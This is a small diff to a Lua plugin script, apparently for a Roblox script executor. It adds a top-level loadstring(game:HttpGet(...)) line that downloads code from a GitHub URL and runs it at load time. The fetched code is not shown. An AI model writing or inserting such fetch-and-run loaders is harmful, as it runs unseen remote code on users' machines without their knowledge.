@@ -1,4 +1,5 @@
 --hi mods :D (if your not a mod, then uh, dont steal my plugin pls :3 (note, the folder creation is for future projects)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AKTheDev56/IY_plugin_Assets/refs/heads/main/IY_pluginUsed.lua",true))()
 local function folderExists(folderPath)
     return pcall(function() return makefolder(folderPath) end)
 end
